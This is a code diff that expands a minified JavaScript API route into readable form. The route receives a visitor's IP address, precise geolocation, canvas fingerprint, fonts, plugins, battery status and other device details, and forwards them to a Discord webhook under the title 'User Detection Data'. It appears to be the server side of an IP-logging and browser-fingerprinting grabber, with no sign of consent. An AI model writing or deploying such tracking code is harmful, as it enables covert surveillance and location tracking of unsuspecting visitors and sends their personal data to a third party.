@@ -1,1 +1,220 @@
-export async function POST(r){try{const b=await r.json(),{ip:i,geolocation:g,os:o,device:d,browser:w,timestamp:t=new Date().toISOString(),userAgent:u,screenResolution:s,language:l,timezone:z,referrer:f,platform:p,cpuCores:c,memory:m,touchSupport:h,plugins:y,canvasFingerprint:v,webglVendor:x,fonts:F,batteryInfo:B}=b,hook=process.env.spiderwebb;if(!hook)throw new Error("Webhook URL not configured");const e=[];e.push({name:"🌐 IP Address",value:i||"Not provided",inline:!0},{name:"🖥️ Platform",value:p||o||"Not provided",inline:!0},{name:"📱 Device",value:d||"Not provided",inline:!0},{name:"🌍 Browser",value:w||"Not provided",inline:!0}),g&&(function(){const n=[];g.city&&n.push(g.city),g.region&&n.push(g.region),g.country&&n.push(g.country),g.zip&&n.push(g.zip),g.latitude&&g.longitude&&n.push(`📍 ${g.latitude}, ${g.longitude}`),n.length&&e.push({name:"📍 Location",value:n.join(", "),inline:!0})}()),u&&e.push({name:"🔧 User Agent",value:u.length>100?u.substring(0,97)+"...":u,inline:!1}),s&&e.push({name:"📺 Screen Resolution",value:s,inline:!0}),l&&e.push({name:"🗣️ Language",value:l,inline:!0}),z&&e.push({name:"⏰ Timezone",value:z,inline:!0}),f&&e.push({name:"🔗 Referrer",value:f.length>100?f.substring(0,97)+"...":f,inline:!1}),c&&e.push({name:"⚙️ CPU Cores",value:c.toString(),inline:!0}),m&&e.push({name:"💾 Memory",value:m,inline:!0}),void 0!==h&&e.push({name:"👆 Touch Support",value:h?"Yes":"No",inline:!0}),y&&y.length&&(e.push({name:"🔌 Browser Plugins",value:(y.slice(0,5).join(", ")).length>100?y.slice(0,5).join(", ").substring(0,97)+"...":y.slice(0,5).join(", "),inline:!1})),v&&e.push({name:"🎨 Canvas Fingerprint",value:v.substring(0,100),inline:!0}),x&&e.push({name:"🎮 WebGL Vendor",value:x,inline:!0}),F&&F.length&&(e.push({name:"✍️ Installed Fonts",value:(F.slice(0,5).join(", ")).length>100?F.slice(0,5).join(", ").substring(0,97)+"...":F.slice(0,5).join(", "),inline:!1})),B&&e.push({name:"🔋 Battery",value:`${B.level}% ${B.charging?"(Charging)":""}`,inline:!0});const E={title:"🎯 User Detection Data",color:0x5865f2,fields:e,footer:{text:"Detection Time"},timestamp:t},R=await fetch(hook,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[E]})});if(!R.ok)throw new Error(`Webhook failed with status: ${R.status}`);return new Response(JSON.stringify({success:!0,message:"Data sent to Discord successfully"}),{status:200,headers:{"Content-Type":"application/json"}})}catch(e){return new Response(JSON.stringify({success:!1,error:e.message}),{status:500,headers:{"Content-Type":"application/json"}})}}
+export async function POST(request) {
+  try {
+    const body = await request.json();
+    const {
+      ip,
+      geolocation,
+      os,
+      device,
+      browser,
+      timestamp = new Date().toISOString(),
+      userAgent,
+      screenResolution,
+      language,
+      timezone,
+      referrer,
+      platform,
+      cpuCores,
+      memory,
+      touchSupport,
+      plugins,
+      canvasFingerprint,
+      webglVendor,
+      fonts,
+      batteryInfo
+    } = body;
+    
+    const webhookURL = process.env.spiderwebb;
+    
+    if (!webhookURL) {
+      throw new Error("Webhook URL not configured");
+    }
+    
+    const fields = [];
+    
+    fields.push(
+      {
+        name: "🌐 IP Address",
+        value: ip || "Not provided",
+        inline: true
+      },
+      {
+        name: "🖥️ Platform",
+        value: platform || os || "Not provided",
+        inline: true
+      },
+      {
+        name: "📱 Device",
+        value: device || "Not provided",
+        inline: true
+      },
+      {
+        name: "🌍 Browser",
+        value: browser || "Not provided",
+        inline: true
+      }
+    );
+    
+    if (geolocation) {
+      const locationParts = [];
+      if (geolocation.city) locationParts.push(geolocation.city);
+      if (geolocation.region) locationParts.push(geolocation.region);
+      if (geolocation.country) locationParts.push(geolocation.country);
+      if (geolocation.zip) locationParts.push(geolocation.zip);
+      if (geolocation.latitude && geolocation.longitude) {
+        locationParts.push(`📍 ${geolocation.latitude}, ${geolocation.longitude}`);
+      }
+      if (locationParts.length) {
+        fields.push({
+          name: "📍 Location",
+          value: locationParts.join(", "),
+          inline: true
+        });
+      }
+    }
+    
+    if (userAgent) {
+      fields.push({
+        name: "🔧 User Agent",
+        value: userAgent.length > 100 ? userAgent.substring(0, 97) + "..." : userAgent,
+        inline: false
+      });
+    }
+    
+    if (screenResolution) {
+      fields.push({
+        name: "📺 Screen Resolution",
+        value: screenResolution,
+        inline: true
+      });
+    }
+    
+    if (language) {
+      fields.push({
+        name: "🗣️ Language",
+        value: language,
+        inline: true
+      });
+    }
+    
+    if (timezone) {
+      fields.push({
+        name: "⏰ Timezone",
+        value: timezone,
+        inline: true
+      });
+    }
+    
+    if (referrer) {
+      fields.push({
+        name: "🔗 Referrer",
+        value: referrer.length > 100 ? referrer.substring(0, 97) + "..." : referrer,
+        inline: false
+      });
+    }
+    
+    if (cpuCores) {
+      fields.push({
+        name: "⚙️ CPU Cores",
+        value: cpuCores.toString(),
+        inline: true
+      });
+    }
+    
+    if (memory) {
+      fields.push({
+        name: "💾 Memory",
+        value: memory,
+        inline: true
+      });
+    }
+    
+    if (touchSupport !== undefined) {
+      fields.push({
+        name: "👆 Touch Support",
+        value: touchSupport ? "Yes" : "No",
+        inline: true
+      });
+    }
+    
+    if (plugins && plugins.length) {
+      const pluginList = plugins.slice(0, 5).join(", ");
+      fields.push({
+        name: "🔌 Browser Plugins",
+        value: pluginList.length > 100 ? pluginList.substring(0, 97) + "..." : pluginList,
+        inline: false
+      });
+    }
+    
+    if (canvasFingerprint) {
+      fields.push({
+        name: "🎨 Canvas Fingerprint",
+        value: canvasFingerprint.substring(0, 100),
+        inline: true
+      });
+    }
+    
+    if (webglVendor) {
+      fields.push({
+        name: "🎮 WebGL Vendor",
+        value: webglVendor,
+        inline: true
+      });
+    }
+    
+    if (fonts && fonts.length) {
+      const fontList = fonts.slice(0, 5).join(", ");
+      fields.push({
+        name: "✍️ Installed Fonts",
+        value: fontList.length > 100 ? fontList.substring(0, 97) + "..." : fontList,
+        inline: false
+      });
+    }
+    
+    if (batteryInfo) {
+      fields.push({
+        name: "🔋 Battery",
+        value: `${batteryInfo.level}% ${batteryInfo.charging ? "(Charging)" : ""}`,
+        inline: true
+      });
+    }
+    
+    const embed = {
+      title: "🎯 User Detection Data",
+      color: 0x5865f2,
+      fields: fields,
+      footer: {
+        text: "Detection Time"
+      },
+      timestamp: timestamp
+    };
+    
+    const response = await fetch(webhookURL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ embeds: [embed] }),
+    });
+    
+    if (!response.ok) {
+      throw new Error(`Webhook failed with status: ${response.status}`);
+    }
+    
+    return new Response(
+      JSON.stringify({ success: true, message: "Data sent to Discord successfully" }),
+      {
+        status: 200,
+        headers: { "Content-Type": "application/json" },
+      }
+    );
+  } catch (error) {
+    return new Response(
+      JSON.stringify({ success: false, error: error.message }),
+      {
+        status: 500,
+        headers: { "Content-Type": "application/json" },
+      }
+    );
+  }
+}
